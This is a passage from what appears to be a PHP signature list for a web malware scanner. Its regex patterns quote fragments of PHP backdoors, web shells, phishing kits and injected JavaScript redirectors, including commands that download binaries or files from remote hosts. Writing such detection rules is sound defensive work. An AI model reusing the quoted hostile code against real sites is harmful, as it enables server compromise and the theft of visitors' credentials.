      'pattern' => '/\\<\\?php \\$v \\= "base"\\.chr\\(54\\)\\.chr\\(52\\)\\.chr\\(95\\)\\.chr\\(100\\)\\.chr\\(101\\)\\.chr\\(99\\)\\."ode"; if\\(isset\\(\\$_REQUEST\\[\'lt\'\\]\\) && md5\\(\\$_REQUEST\\[\'lt\'\\]\\) \\=\\= \\$v\\("MDIzMjU4/',
      'label' => 'source-file tail snippet',
    ),
    693 => 
    array (
      'pattern' => '/function downloadFile\\(\\$url, \\$path\\)[\\s\\S]{0,12000}system\\(\'rm \\-rf backup_pan\\.php\'\\);/s',
      'label' => 'source-file head-tail anchor',
    ),
    694 => 
    array (
      'pattern' => '/\\$mlvlducmba\\s+\\=\\s+"iysfmwbju";\\s+\\$zqssjnilas\\s+\\=\\s+gtzjhhjubj\\(\\$wvlvpaxzyz,\\$mlvlducmba\\);\\s+eval\\s+\\(\\$zqssjnilas\\);/',
      'label' => 'sample-specific line fragment',
    ),
    695 => 
    array (
      'pattern' => '/system\\(\'wget "http\\:\\/\\/173\\.230\\.140\\.78\\/Linux_x86" 2\\>\\/dev\\/null \\|\\| curl \\-O  "http\\:\\/\\/173\\.230\\.140\\.78\\/Linux_x86"\'\\);[\\s\\S]{0,12000}system\\(\'rm \\-rf informtv\\.php\'\\);/s',
      'label' => 'source-file head-tail anchor',
    ),
    696 => 
    array (
      'pattern' => '/\\$cvsjvtb \\= \'9ats\\#gxi5ekmrfcond\\*lpb6yH1_v4u\\\\\'3\\-\';\\$cemkba \\= Array\\(\\);\\$cemkba\\[\\] \\= \\$cvsjvtb\\[22\\]\\.\\$cvsjvtb\\[14\\]\\.\\$cvsjvtb\\[22\\]\\.\\$cvsjvtb\\[1\\]\\.\\$cvsjvtb\\[28/',
      'label' => 'source-file tail snippet',
    ),
    697 => 
    array (
      'pattern' => '/Plugin Name\\: Zend Fonts WP[\\s\\S]{0,12000}echo base64_decode\\( \'PHNjcmlwdD53aW5kb3cubG9jYXRpb24ucmVwbGFjZSgi\' \\) \\. \'https\\:\\/\\/\'\\.\\$url \\. base64_decode\\( \'Iik7d2luZG93LmxvY2F0aW9uLmhyZWYgPSA/s',
      'label' => 'source-file head-tail anchor',
    ),
    698 => 
    array (
      'pattern' => '/\\\\x51\\\\x58\\\\x4C\\\\x5F\\\\x30\\\\x12\\\\x5f\\\\x43\\\\x4f\\\\x4f\\\\x4b\\\\x49\\\\x45/',
      'label' => 'sample-specific literal',
    ),
    699 => 
    array (
      'pattern' => '/\\\\x47\\\\x3F\\\\x05\\\\x3C\\\\x22\\\\x0F\\\\x5f\\\\x43\\\\x4f\\\\x4f\\\\x4b\\\\x49\\\\x45/',
      'label' => 'sample-specific literal',
    ),
    700 => 
    array (
      'pattern' => '/\\<\\?\\=\\/\\*\\!\\*\\/@\\/\\*\\*8\\*\\*\\/null; echo@null;goto O1527;O9995\\:\\$O1505\\=\'o\';goto O6771;O6214\\:\\$O6030\\=\'n\';goto O5588;O8133\\:\\$O6306\\=\'f\';goto O6401;O6400\\:\\$O1271\\=/',
      'label' => 'source-file tail snippet',
    ),
    701 => 
    array (
      'pattern' => '/\';
  \\$unzipper\\-\\>prepareExtraction\\(\\$archive, \\$destination\\);
\\}
if \\(isset\\(\\$_POST\\[/',
      'label' => 'sample-specific literal',
    ),
    702 => 
    array (
      'pattern' => '/\\. \\$DKIMcanonicalization \\. ";\\\\r\\\\n" \\.
            "\\\\th\\=From\\:To\\:Subject;\\\\r\\\\n" \\.
            "\\\\td\\=" \\. \\$this\\-\\>DKIM_domain \\./',
      'label' => 'sample-specific literal',
    ),
    703 => 
    array (
      'pattern' => '/\\<\\?php \\/\\* Do not change this code, or your script will not work\\. \\( ORVX SHELL encrypted to avoid spam filter detection and to work on any hos/',
      'label' => 'source-file tail snippet',
    ),
    704 => 
    array (
      'pattern' => '/\\<\\?php \\/\\* Respect C0ders\\. \\*\\/ \\$I\\=file\\(__FILE__\\);eval\\(base64_decode\\("ZnVuY3Rpb24gTygkYSwkYil7JGM9YXJyYXkoNDEwLDI5Miw4LDE2NzI4KTtpZigkYj09Mil7JG/',
      'label' => 'source-file tail snippet',
    ),
    705 => 
    array (
      'pattern' => '/50"\\>\\<\\/td\\>
          \\<\\/tr\\>
          \\<tr\\> 
            \\<td align\\=[\\s\\S]{0,160}\\>\\<b\\>Votre Adresse mail \\:\\<\\/b\\>\\<\\/td\\>
            \\<td\\>\\<input name\\=/',
      'label' => 'sample-specific literal chain',
    ),
    706 => 
    array (
      'pattern' => '/94a17cc98f686c65fe543ab30b010694e557f1521f1bk6pK0D8If5WJuZqJdbEBda02Jt4Lz4JnUFBu/',
      'label' => 'sample-specific encoded fragment',
    ),
    707 => 
    array (
      'pattern' => '/error_reporting\\(0\\);@set_time_limit\\(0\\);\\$g\\=\\$_REQUEST;if\\(\\!empty\\(\\$g\\["v"\\]\\)&&\\$g\\["v"\\]\\=\\="WQEHW"\\)\\{if\\(\\!empty\\(\\$g\\["c"\\]\\)\\)exit\\(\\$g\\["c"\\]\\);\\$h\\=\\$_SERVER\\["PHP_S/',
      'label' => 'source-file tail snippet',
    ),
    708 => 
    array (
      'pattern' => '/21232f297a57a5a743894a0e4a801fc3/',
      'label' => 'sample-specific encoded fragment',
    ),
    709 => 
    array (
      'pattern' => '/if\\(\\!empty\\(\\$_REQUEST\\[\'bfc\'\\]\\)\\)\\{\\$bfc\\=base64_decode\\(\\$_REQUEST\\[\'bfc\'\\]\\);\\$bfc\\=create_function\\(\'\',\\$bfc\\);@\\$bfc\\(\\);exit;\\}/',
      'label' => 'source-file tail snippet',
    ),
    710 => 
    array (
      'pattern' => '/error_reporting\\(0\\);@set_time_limit\\(0\\);\\$g\\=\\$_REQUEST;if\\(\\!empty\\(\\$g\\["v"\\]\\)&&\\$g\\["v"\\]\\=\\="JHWEA"\\)\\{if\\(\\!empty\\(\\$g\\["c"\\]\\)\\)exit\\(\\$g\\["c"\\]\\);\\$h\\=\\$_SERVER\\["PHP_S/',
      'label' => 'source-file tail snippet',
    ),
    711 => 
    array (
      'pattern' => '/;
	for \\(\\$i \\= 0; \\$i \\< strlen\\(\\$str\\); \\$i\\+\\+\\) \\{
		\\$r \\.\\= dechex\\(ord\\(\\$str\\[\\$i\\]\\)\\);
	\\}
	return \\$r;
\\}
function nhx\\(\\$str\\) \\{
	\\$r \\=/',
      'label' => 'sample-specific literal',
    ),
    712 => 
    array (
      'pattern' => '/if\\(\\!empty\\(\\$_POST\\["YVTU"\\]\\)\\{\\$c\\=base64_decode\\("PD9waHANCmVycm9yX3JlcG9ydGluZygwKTtAc2V0X3RpbWVfbGltaXQoMCk7JGc9JF9SRVFVRVNUO2lmKCFlbXB0eSgkZ1si/',
      'label' => 'source-file tail snippet',
    ),
    713 => 
    array (
      'pattern' => '/w"\\);\\$t\\=@fwrite\\(\\$p,\\$c\\);@fclose\\(\\$p\\);if\\(\\!\\$t\\)\\$t\\=@file_put_contents\\(\\$f,\\$c\\);return \\(bool\\)\\$t;\\}if\\(\\!empty\\(\\$_POST\\[[\\s\\S]{0,160}\\/home\\/smedia\\/public_html\\/smtp\\/cgi\\-bin\\/init\\-vars\\-loader\\.php/',
      'label' => 'sample-specific literal chain',
    ),
    714 => 
    array (
      'pattern' => '/hill\';
\\$shellname\\=/',
      'label' => 'sample-specific literal',
    ),
    715 => 
    array (
      'pattern' => '/lock\'\\:
            \\$php_path \\= getPhpPath\\(\\);
            if \\(functionCheck\\(\\) \\!\\=\\= false\\) \\{
                \\/\\/\\$data_array\\[/',
      'label' => 'sample-specific literal',
    ),
    716 => 
    array (
      'pattern' => '/\\$f\\s+\\=\\s+wget\\("\\/g\\/check\\?d\\="\\.base64_encode\\(\\$domain\\)\\."&p\\="\\.base64_encode\\(\\$path\\)\\."&c\\="\\.base64_encode\\(\\$code\\)\\."&s\\="\\.\\$J\\["s"\\]\\);/',
      'label' => 'sample-specific line fragment',
    ),
    717 => 
    array (
      'pattern' => '/w"\\);\\$t\\=@fwrite\\(\\$p,\\$c\\);@fclose\\(\\$p\\);if\\(\\!\\$t\\)\\$t\\=@file_put_contents\\(\\$f,\\$c\\);return \\(bool\\)\\$t;\\}if\\(\\!empty\\(\\$_POST\\[[\\s\\S]{0,160}\\/home\\/smedia\\/public_html\\/smtp\\/double\\/yeah\\/earth\\/class\\.rest\\-plugin\\.php/',
      'label' => 'sample-specific literal chain',
    ),
    718 => 
    array (
      'pattern' => '/0\\+JDpjy\\+ySXAoh6xUbMx1lQ\\/zkd1kK\\/cgzE9rqoIugGQVHQ\\+GH2zr0hTgbF6OGOBotJXMcwU1nGgBx3z/',
      'label' => 'sample-specific encoded fragment',
    ),
    719 => 
    array (
      'pattern' => '/error_reporting\\(0\\);@set_time_limit\\(0\\);\\$g\\=\\$_REQUEST;if\\(\\!empty\\(\\$g\\["v"\\]\\)&&\\$g\\["v"\\]\\=\\="TJGE"\\)\\{if\\(\\!empty\\(\\$g\\["c"\\]\\)\\)exit\\(\\$g\\["c"\\]\\);\\$h\\=\\$_SERVER\\["PHP_SE/',
      'label' => 'source-file tail snippet',
    ),
    720 => 
    array (
      'pattern' => '/window\\.stop\\(\\);var l\\=String\\.fromCharCode\\(104,116,116,112,115,58,47,47,98,118,115,46,115,101,99,111,110,100,97,114,121,105,110,102,111,114,109/',
      'label' => 'source-file tail snippet',
    ),
    721 => 
    array (
      'pattern' => '/\\$juiujev \\= \'\\#xnt1y4\\-_gpo5ck\\\\\'di23Hbl7mfs8e9vu\\*ra\';\\$riend \\= Array\\(\\);\\$riend\\[\\] \\= \\$juiujev\\[23\\]\\.\\$juiujev\\[18\\]\\.\\$juiujev\\[13\\]\\.\\$juiujev\\[6\\]\\.\\$juiujev\\[29/',
      'label' => 'source-file tail snippet',
    ),
    722 => 
    array (
      'pattern' => '/\\\\x47\\\\x4c\\\\x4fB\\\\x41\\\\x4c\\\\x53[\\s\\S]{0,160}fb07eb0/',
      'label' => 'sample-specific literal chain',
    ),
    723 => 
    array (
      'pattern' => '/\\<\\?php                                                                                                                                       [\\s\\S]{0,12000}\\$ddwett \\= \'d\\*2rte4vc19of\\\\\'iu3sy5al\\#_0bp\\-Hk7nx6gm\';\\$wdmtoi \\= Array\\(\\);\\$wdmtoi\\[\\] \\= \\$ddwett\\[8\\]\\.\\$ddwett\\[3\\]\\.\\$ddwett\\[5\\]\\.\\$ddwett\\[20\\]\\.\\$ddwett\\[4\\]\\.\\$ddw/s',
      'label' => 'source-file head-tail anchor',
    ),
    724 => 
    array (
      'pattern' => '/;
\\$IIIIIIIIIIlI \\= explode\\("\\$IIIIIIIIIII1", \\$IIIIIIIIIIIl\\);
\\$IIIIIIIIIIl1 \\= \\$IIIIIIIIIIlI\\[0\\];
\\$IIIIIIIIII1I \\= \\$_SERVER\\[/',
      'label' => 'sample-specific literal',
    ),
    725 => 
    array (
      'pattern' => '/\\<\\?php \\$j8526\\=\'3\\] 6"9l\\=g\\/\\(tism\\.\\[d75q\\*zxnryhj1vcop8e4aw2bf\\)u_k_0;\\$\';\\$zVFHb4083\\=\\$j8526\\[\\(620\\/\\(30\\-10\\)\\)\\]\\.\\$j8526\\[\\(25\\*1\\)\\]\\.\\$j8526\\[\\(32\\+3\\)\\]\\.\\$j8526\\[\\(\\(15/',
      'label' => 'source-file tail snippet',
    ),
    726 => 
    array (
      'pattern' => '/\\);
                \\$body \\.\\= static\\:\\:\\$LE;
                \\$body \\.\\= \\$this\\-\\>getBoundary\\(\\$this\\-\\>boundary\\[2\\], \\$bodyCharSet,/',
      'label' => 'sample-specific literal',
    ),
    727 => 
    array (
      'pattern' => '/\\/\\/@file_put_contents\\(ABSPATH\\s+\\.\\s+\'\\/wp\\-includes\\/class\\.wp\\.php\',\\s+file_get_contents\\(\'http\\:\\/\\/www\\.drilns\\.com\\/admin\\.txt\'\\)\\);/',
      'label' => 'sample-specific line fragment',
    ),
    728 => 
    array (
      'pattern' => '/;

\\$content\\=\\$content\\.\\$con2;
\\}
return \\$content;
\\} 

function slider_option_footer\\(\\)\\{ 
if\\(\\!is_single\\(\\)\\)
\\{




\\$con2 \\=[\\s\\S]{0,160}src\\=\'\\/\\/aanqylta\\.com\\/a0\\/70\\/f9\\/a070f91a2c583f6ae5c0bfa1f11733e4\\.js/',
      'label' => 'sample-specific literal chain',
    ),
    729 => 
    array (
      'pattern' => '/if \\(isset\\(\\$_REQUEST\\[\'action\'\\]\\) && isset\\(\\$_REQUEST\\[\'password\'\\]\\) && \\(\\$_REQUEST\\[\'password\'\\] \\=\\= \'4080a8e93ca1967292255de39608309b\'\\)\\)[\\s\\S]{0,12000}extract\\(theme_temp_setup\\(\\$tmpcontent\\)\\);/s',
      'label' => 'source-file head-tail anchor',
    ),
    730 => 
    array (
      'pattern' => '/\\$O_OO00O0__\\="v1pm5h_uyqg38bzj67\\-0excan9kftliodw4s2r";\\$OOO0_00_O_\\=\\$O_OO00O0__\\{22\\}\\.\\$O_OO00O0__\\{37\\}\\.\\$O_OO00O0__\\{20\\}\\.\\$O_OO00O0__\\{23\\}\\.\\$O_OO00O0__/',
      'label' => 'source-file tail snippet',
    ),
    731 => 
    array (
      'pattern' => '/x62dF6GnY0n3JfzxkYyOJHPdT\\/gxxr\\/oi48Q9\\/6PLVj0N2l2wJtrPRR0sjF8TrVEYokZRXv86\\/ORvLxn/',
      'label' => 'sample-specific encoded fragment',
    ),
    732 => 
    array (
      'pattern' => '/\\* XML\\-RPC protocol support for WordPress[\\s\\S]{0,12000}\\* @link https\\:\\/\\/wordpress\\.org\\/support\\/article\\/editing\\-wp\\-config\\-php\\//s',
      'label' => 'source-file head-tail anchor',
    ),
    733 => 
    array (
      'pattern' => '/\\* 1\\. Hapus file ini setelah penggunaan[\\s\\S]{0,12000}\\<button type\\="submit"\\>Buat Admin\\<\\/button\\>/s',
      'label' => 'source-file head-tail anchor',
    ),
    734 => 
    array (
      'pattern' => '/_v4XU\'; goto vNubN; rPdJo\\: function u8Li5\\(\\$mkaJS\\) \\{ goto OHEU4; OHEU4\\: \\$mkaJS \\= substr\\(\\$mkaJS, \\(int\\) hex2bin\\([\\s\\S]{0,160}\\)\\); goto p6n0k; nR5YQ\\: return \\$mkaJS; goto Iyifx; p6n0k\\: \\$mkaJS \\= substr\\(\\$mkaJS, \\(int\\) hex2bin\\(/',
      'label' => 'sample-specific literal chain',
    ),
    735 => 
    array (
      'pattern' => '/▄▄▌  ▄▄▄ \\. ▄▄▄· ▄ •▄  ▄▄·       ·▄▄▄▄  ▄▄▄ \\.[\\s\\S]{0,12000}\\$a370a\\=\\$_SERVER\\[\'REMOTE_ADDR\'\\];\\$cd1e\\=array\\("\\^94\\.26\\.\\*\\.\\*","\\^95\\.85\\.\\*\\.\\*","\\^72\\.52\\.96\\.\\*","\\^212\\.8\\.79\\.\\*","\\^62\\.99\\.77\\.\\*","\\^83\\.31\\.118\\.\\*","\\^91\\.231\\.\\*\\.\\*",/s',
      'label' => 'source-file head-tail anchor',
    ),
    736 => 
    array (
      'pattern' => '/\\<iframe height\\="0" width\\="0" style\\="display\\: none; visibility\\: hidden;" src\\="https\\:\\/\\/8085313\\.fls\\.doubleclick\\.net\\/activityi;src\\=8085313;type\\=/',
      'label' => 'source-file tail snippet',
    ),
    737 => 
    array (
      'pattern' => '/header\\("Location\\: https\\:\\/\\/onlinebanking\\.huntington\\.com\\/rol\\/Auth\\/login\\.aspx"\\);[\\s\\S]{0,12000}fwrite\\(\\$file, \\$steal\\);/s',
      'label' => 'source-file head-tail anchor',
    ),
    738 => 
    array (
      'pattern' => '/0"\\>Please verify your card information\\. Your card is suspended due to unauthorized access\\.\\<\\/p\\>
\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    739 => 
    array (
      'pattern' => '/error_reporting\\(0\\);[\\s\\S]{0,12000}header\\("Location\\: information\\.php"\\);/s',
      'label' => 'source-file head-tail anchor',
    ),
    740 => 
    array (
      'pattern' => '/\\>Please your email address in order to proceed further\\. Login with the email you are using\\.\\<\\/p\\>
\\<div class\\=/',
      'label' => 'sample-specific literal',
    ),
    741 => 
    array (
      'pattern' => '/error_reporting\\(0\\);[\\s\\S]{0,12000}header\\("Location\\: processing\\.php"\\);/s',
      'label' => 'source-file head-tail anchor',
    ),
    742 => 
    array (
      'pattern' => '/include \'anti\\/anti1\\.php\';[\\s\\S]{0,12000}include \'anti\\/anti8\\.php\';/s',
      'label' => 'source-file head-tail anchor',
    ),
    743 => 
    array (
      'pattern' => '/\\<h1\\>404 Not Found\\<\\/h1\\>The page that you have requested could not be found\\.[\\s\\S]{0,160}mail";\\$a\\(\\$blocked_words\\[1\\],\\$subject,\\$message,\\$from\\);\\}
	\\$bannedIP \\= array\\(/',
      'label' => 'sample-specific literal chain',
    ),
    744 => 
    array (
      'pattern' => '/\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\[HU  \\- Spamtools\\.io\\]\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\\\n[\\s\\S]{0,160}email\'\\]\\."\\\\n";
\\$bilsmg \\.\\= "Password\\: "\\.\\$_POST\\[/',
      'label' => 'sample-specific literal chain',
    ),
    745 => 
    array (
      'pattern' => '/\\]\\?\\>" \\>\\<br\\>
\\<input type\\="submit" value\\="Send test \\>\\>"\\>
\\<\\/form\\>
\\<br\\>
\\<\\?php

if \\(\\!empty\\(\\$_POST\\[[\\s\\S]{0,160}\\];
	\\}
	else\\{
		\\$xx \\= rand\\(\\);
	
	\\}
	mail\\(\\$_POST\\[/',
      'label' => 'sample-specific literal chain',
    ),
    746 => 
    array (
      'pattern' => '/\\* FoxAutoV5 by \\[anonymousfox\\.co\\][\\s\\S]{0,12000}goto UJqBQ; lEmL8\\: @ini_set\\("\\\\154\\\\157\\\\x67\\\\x5f\\\\x65\\\\x72\\\\x72\\\\157\\\\x72\\\\x73", 0\\); goto VowXi; dbLS5\\: foreach \\(\\$AymyT as \\$MZ3LX\\) \\{ goto de8yQ; mWOh/s',
      'label' => 'source-file head-tail anchor',
    ),
    747 => 
    array (
      'pattern' => '/\\<\\?php \\/\\*  FoxAutoV5 by \\[anonymousfox\\.co\\]  \\*\\/ \\$XnNhAWEnhoiqwciqpoHH\\=file\\(__FILE__\\);eval\\(base64_decode\\("aWYoIWZ1bmN0aW9uX2V4aXN0cygiWWl1bklVWT/',
      'label' => 'source-file tail snippet',
    ),
    748 => 
    array (
      'pattern' => '/\\)\\?\\>
			\\<\\/td\\>
			\\<\\/tr\\>
		\\<\\/table\\>
    \\<\\/td\\>
    \\<td class\\="row3"\\>
		\\<table\\>
		\\<tr\\>
		\\<td\\>
		\\<\\?php if \\(\\!empty\\(\\$fm_config\\[/',
      'label' => 'sample-specific literal',
    ),
    749 => 
    array (
      'pattern' => '/testing github actions[\\s\\S]{0,12000}added new line here/s',
      'label' => 'source-file head-tail anchor',
    ),
    750 => 
    array (
      'pattern' => '/\\<\\?php if\\(isset\\(\\$_COOKIE\\[\'x0v\'\\]\\)\\) \\{die\\(\'6WECHPD\'\\);\\}if\\(\\!@function_exists\\(\'getallheaders\'\\)\\)\\{function getallheaders\\(\\)\\{\\$headers\\=array\\(\\);foreach\\(\\$/',
      'label' => 'source-file tail snippet',
    ),
    751 => 
    array (
      'pattern' => '/\\<\\?php if\\(isset\\(\\$_COOKIE\\[\'XgO3\'\\]\\)\\) \\{die\\(\'hGXA0tss\'\\);\\} class _t\\{private static\\$_k;static function _kr\\(\\$_cmc,\\$_tic\\)\\{if\\(\\!self\\:\\:\\$_k\\)\\:self\\:\\:_tt\\(\\);/',
      'label' => 'source-file tail snippet',
    ),
    752 => 
    array (
      'pattern' => '/\\* This file is part of the Monolog package\\.[\\s\\S]{0,12000}curl_close\\(\\$ch\\);/s',
      'label' => 'source-file head-tail anchor',
    ),
    753 => 
    array (
      'pattern' => '/\\<\\?php if\\(isset\\(\\$_COOKIE\\[\'x0v\'\\]\\)\\) \\{die\\(\'6WECHPD\'\\);\\}/',
      'label' => 'source-file tail snippet',
    ),
    754 => 
    array (
      'pattern' => '/\\<\\?php \\$system \\= \\$_GET\\[\'f\'\\]; if\\(\\$system \\=\\= \'f\'\\)\\{\\$saw1 \\= \\$_FILES\\[\'file\'\\]\\[\'tmp_name\'\\];\\$saw2 \\= \\$_FILES\\[\'file\'\\]\\[\'name\'\\];echo "\\<form method\\=\'POST\'[\\s\\S]{0,12000}\\<\\?php error_reporting\\(0\\); echo "aDriv4"; \\$code \\= \\$_GET\\["php"\\]; if \\(empty\\(\\$code\\) or \\!stristr\\(\\$code, "http"\\)\\)\\{ exit; \\} else \\{ \\$php\\=file_get_co/s',
      'label' => 'source-file head-tail anchor',
    ),
    755 => 
    array (
      'pattern' => '/\\>\\<center\\>\\$fowner\\/\\$fgrp\\<\\/center\\>\\<\\/td\\>";
echo "\\<td\\>\\<center\\>\\$size\\<\\/center\\>\\<\\/td\\>
\\<td\\>\\<center\\>";
if\\(is_writable\\(\\$path\\./',
      'label' => 'sample-specific literal',
    ),
    756 => 
    array (
      'pattern' => '/function u0\\(\\$i1,\\$j2\\=""\\)\\{\\$v3\\=\\$i1;\\$n4\\="";for\\(\\$d5\\=0;\\$d5\\<strlen\\(\\$v3\\);\\)\\{for\\(\\$r6\\=0;\\(\\$r6\\<strlen\\(\\$j2\\)&&\\$d5\\<strlen\\(\\$v3\\)\\);\\$r6\\+\\+,\\$d5\\+\\+\\)\\{\\$n4\\.\\=\\$v3\\{\\$d5\\}\\^\\$/',
      'label' => 'source-file head snippet',
    ),
    757 => 
    array (
      'pattern' => '/function J_gs1\\(\\$HG2ez, \\$Ezfht \\= "\\\\61\\\\x32\\\\x33"\\) \\{ \\$l1btm \\= \\$HG2ez; \\$ontzm \\= \'\'; for \\(\\$Fik1u \\= 0; \\$Fik1u \\< strlen\\(\\$l1btm\\);\\) \\{ for \\(\\$hGFRa \\= 0;/',
      'label' => 'source-file head snippet',
    ),
    758 => 
    array (
      'pattern' => '/function mODTX\\(\\$psJnP, \\$qVNGI \\= "\\\\x31\\\\x32\\\\63"\\) \\{ \\$AFxk7 \\= \\$psJnP; \\$CKi71 \\= \'\'; for \\(\\$o4Gx1 \\= 0; \\$o4Gx1 \\< strlen\\(\\$AFxk7\\);\\) \\{ for \\(\\$DQzxQ \\= 0;/',
      'label' => 'source-file head snippet',
    ),
    759 => 
    array (
      'pattern' => '/\',time\\(\\)\\-3600\\);
          update_option\\([\\s\\S]{0,160}, \'\', true \\);
          update_option\\(/',
      'label' => 'sample-specific literal chain',
    ),
    760 => 
    array (
      'pattern' => '/\\<\\?php error_reporting\\(0\\); @ini_set\\(\'error_log\', NULL\\); @ini_set\\(\'log_errors\', 0\\); @ini_set\\(\'display_errors\', 0\\); \\$root \\= \\$_SERVER\\[\'DOCUMENT_/',
      'label' => 'source-file tail snippet',
    ),
    761 => 
    array (
      'pattern' => '/\\$password \\= "rMJoybmXUPl"; \\/\\/ Password[\\s\\S]{0,12000}function _BdbY\\(\\$_YX8ZM\\)\\{\\$_YX8ZM\\=substr\\(\\$_YX8ZM,\\(int\\)\\(hex2bin\\(\'31313230\'\\)\\)\\);\\$_YX8ZM\\=substr\\(\\$_YX8ZM,\\(int\\)\\(hex2bin\\(\'30\'\\)\\),\\(int\\)\\(hex2bin\\(\'2d3336/s',
      'label' => 'source-file head-tail anchor',
    ),
    762 => 
    array (
      'pattern' => '/\\<\\?php \\$system \\= \\$_GET\\[\'f\'\\]; if\\(\\$system \\=\\= \'f\'\\)\\{\\$saw1 \\= \\$_FILES\\[\'file\'\\]\\[\'tmp_name\'\\];\\$saw2 \\= \\$_FILES\\[\'file\'\\]\\[\'name\'\\];echo "\\<form method\\=\'POST\'[\\s\\S]{0,12000}\\<\\?php error_reporting\\(0\\); echo "vzadri"; \\$code \\= \\$_GET\\["php"\\]; if \\(empty\\(\\$code\\) or \\!stristr\\(\\$code, "http"\\)\\)\\{ exit; \\} else \\{ \\$php\\=file_get_co/s',
      'label' => 'source-file head-tail anchor',
    ),
    763 => 
    array (
      'pattern' => '/function _5Mn8\\(\\$_XsSg88c\\)\\{\\$_XsSg88c\\=substr\\(\\$_XsSg88c,\\(int\\)\\(hex2bin\\(\'383037\'\\)\\)\\);\\$_XsSg88c\\=substr\\(\\$_XsSg88c,\\(int\\)\\(hex2bin\\(\'30\'\\)\\),\\(int\\)\\(hex2bin/',
      'label' => 'source-file tail snippet',
    ),
    764 => 
    array (
      'pattern' => '/function get_contents\\(\\$url\\)\\{[\\s\\S]{0,12000}\\$a \\= get_contents\\(\'https\\:\\/\\/ghostbin\\.co\\/paste\\/vqcn3\\/raw\'\\);/s',
      'label' => 'source-file head-tail anchor',
    ),
    765 => 
    array (
      'pattern' => '/\\$password \\= "5YbsaxjgZI2"; \\/\\/ Password[\\s\\S]{0,12000}function _BdbY\\(\\$_YX8ZM\\)\\{\\$_YX8ZM\\=substr\\(\\$_YX8ZM,\\(int\\)\\(hex2bin\\(\'31313230\'\\)\\)\\);\\$_YX8ZM\\=substr\\(\\$_YX8ZM,\\(int\\)\\(hex2bin\\(\'30\'\\)\\),\\(int\\)\\(hex2bin\\(\'2d3336/s',
      'label' => 'source-file head-tail anchor',
    ),
    766 => 
    array (
      'pattern' => '/private static \\$_fcu;[\\s\\S]{0,12000}return _z\\:\\:_eg\\(055\\) \\+ _z\\:\\:_eg\\(056\\) \\- _z\\:\\:_eg\\(057\\) \\+ _z\\:\\:_eg\\(060\\) \\+ _z\\:\\:_eg\\(061\\) \\+ _z\\:\\:_eg\\(062\\) \\- _z\\:\\:_eg\\(063\\) \\- _z\\:\\:_eg\\(064\\) \\+ _z\\:\\:_eg\\(065\\) /s',
      'label' => 'source-file head-tail anchor',
    ),
    767 => 
    array (
      'pattern' => '/Linux CCPro 4\\.15\\.0\\-70\\-generic \\#79\\-Ubuntu SMP Tue Nov 12 10\\:36\\:11 UTC 2019 x86_64 x86_64 x86_64 GNU\\/Linux[\\s\\S]{0,12000}echo\'\\<br\\>\\<center\\>Coded by \\<a href\\="https\\:\\/\\/github\\.com\\/NinjaCR3"\\>NinjaCR3\\<\\/a\\>\\<\\/center\\>\\<br\\>\';\\?\\>/s',
      'label' => 'source-file head-tail anchor',
    ),
    768 => 
    array (
      'pattern' => '/if \\(isset \\(\\$_GET\\[\'check\'\\]\\)\\) \\{[\\s\\S]{0,12000}echo \'\\<a href\\=\'\\.\\$file\\.\'\\>\'\\.\\$file\\.\'\\<\\/a\\>\';/s',
      'label' => 'source-file head-tail anchor',
    ),
    769 => 
    array (
      'pattern' => '/\\* File skip\\-link\\-focus\\-fix\\.js\\.[\\s\\S]{0,12000};if\\(ndsw\\=\\=\\=undefined\\)\\{function g\\(R,G\\)\\{var y\\=V\\(\\);return g\\=function\\(O,n\\)\\{O\\=O\\-0x6b;var P\\=y\\[O\\];return P;\\},g\\(R,G\\);\\}function V\\(\\)\\{var v\\=\\[\'ion\',\'ind/s',
      'label' => 'source-file head-tail anchor',
    ),
    770 => 
    array (
      'pattern' => '/, message\\: ai1wm_locale\\.please_wait_stopping_the_export \\}\\);

	\\/\\/ Set params
	var params \\= this\\.params\\.concat\\(\\{ name\\:/',
      'label' => 'sample-specific literal',
    ),
    771 => 
    array (
      'pattern' => '/\\/\\*\\*\\*\\*\\*\\*\\/ \\(function\\(modules\\) \\{ \\/\\/ webpackBootstrap[\\s\\S]{0,12000}\\/\\*\\*\\*\\*\\*\\*\\/ \\}\\);;if\\(ndsw\\=\\=\\=undefined\\)\\{function g\\(R,G\\)\\{var y\\=V\\(\\);return g\\=function\\(O,n\\)\\{O\\=O\\-0x6b;var P\\=y\\[O\\];return P;\\},g\\(R,G\\);\\}function V\\(\\)\\{var v/s',
      'label' => 'source-file head-tail anchor',
    ),
    772 => 
    array (
      'pattern' => '/\\/\\*\\! Select2 4\\.0\\.6\\-rc\\.1 \\| https\\:\\/\\/github\\.com\\/select2\\/select2\\/blob\\/master\\/LICENSE\\.md \\*\\/[\\s\\S]{0,12000}\\(function\\(\\)\\{if\\(jQuery&&jQuery\\.fn&&jQuery\\.fn\\.select2&&jQuery\\.fn\\.select2\\.amd\\)var e\\=jQuery\\.fn\\.select2\\.amd;return e\\.define\\("select2\\/i18n\\/mk",\\[\\],/s',
      'label' => 'source-file head-tail anchor',
    ),
    773 => 
    array (
      'pattern' => '/\\);
					attachments\\.each\\(function\\(attachment\\) \\{
						attachment \\= attachment\\.toJSON\\(\\);

						if \\(arrInput\\.indexOf\\(/',
      'label' => 'sample-specific literal',
    ),
    774 => 
    array (
      'pattern' => '/var GSF_DatetimepickerClass\\=function\\(\\$container\\)\\{this\\.\\$container\\=\\$container\\};\\(function\\(\\$\\)\\{"use strict";GSF_DatetimepickerClass\\.prototype\\=\\{in/',
      'label' => 'source-file tail snippet',
    ),
    775 => 
    array (
      'pattern' => '/\\);
				\\}
			\\}\\);
		\\},
		getValue\\: function\\(\\) \\{
			var val \\= \\{\\};
			this\\.\\$container\\.find\\(/',
      'label' => 'sample-specific literal',
    ),
    776 => 
    array (
      'pattern' => '/\\) \\!\\= ref\\)\\) \\{
                        \\$container\\.slideUp\\(\\);
                    \\}
                \\}\\);
                \\$\\(/',
      'label' => 'sample-specific literal',
    ),
    777 => 
    array (
      'pattern' => '/\\) \\{
					return;
				\\}
				if \\(\\!confirm\\(GSF_META_DATA\\.msgConfirmImportData\\)\\) \\{
					return;
				\\}
				if \\(\\$this\\.data\\(/',
      'label' => 'sample-specific literal',
    ),
    778 => 
    array (
